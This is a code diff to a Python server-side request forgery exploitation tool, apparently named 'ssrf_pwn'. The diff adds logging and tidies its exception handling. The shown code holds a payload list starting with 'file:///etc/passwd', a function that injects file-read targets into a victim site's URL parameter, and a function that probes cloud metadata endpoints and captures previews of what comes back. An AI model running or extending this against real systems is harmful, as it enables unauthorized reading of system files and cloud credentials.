@@ -1,5 +1,10 @@
+import re
 from typing import Optional, Dict
 import requests
+
+from tools.log_utils import get_logger
+
+logger = get_logger("ssrf_pwn")
 
 SSRF_EXPLOIT_URLS = [
     "file:///etc/passwd",
@@ -35,8 +40,8 @@ def check_file_read(url: str, param: str, sess=None, timeout=10.0) -> list:
             r = sess.get("%s%s%s=%s" % (url, sep, param, target), timeout=timeout, verify=False)
             if len(r.text) > 50:
                 results.append({"target": target[:30], "size": len(r.text), "preview": r.text[:100]})
-        except:
-            pass
+        except Exception as e:
+            logger.debug("file_read %s: %s", target[:20], e)
     return results
 
 
@@ -53,12 +58,12 @@ def check_cloud_metadata(url: str, param: str, sess=None, timeout=10.0) -> Dict:
             if len(r.text) > 20:
                 for cloud, patterns in CLOUD_EVIDENCE.items():
                     for pat in patterns:
-                        if __import__("re").search(pat, r.text, __import__("re").IGNORECASE):
+                        if re.search(pat, r.text, re.IGNORECASE):
                             result[cloud] = {"url": target[:30], "size": len(r.text),
                                               "preview": r.text[:150]}
                             break
-        except:
-            pass
+        except Exception as e:
+            logger.debug("cloud_meta %s: %s", target[:20], e)
     return result
 
 
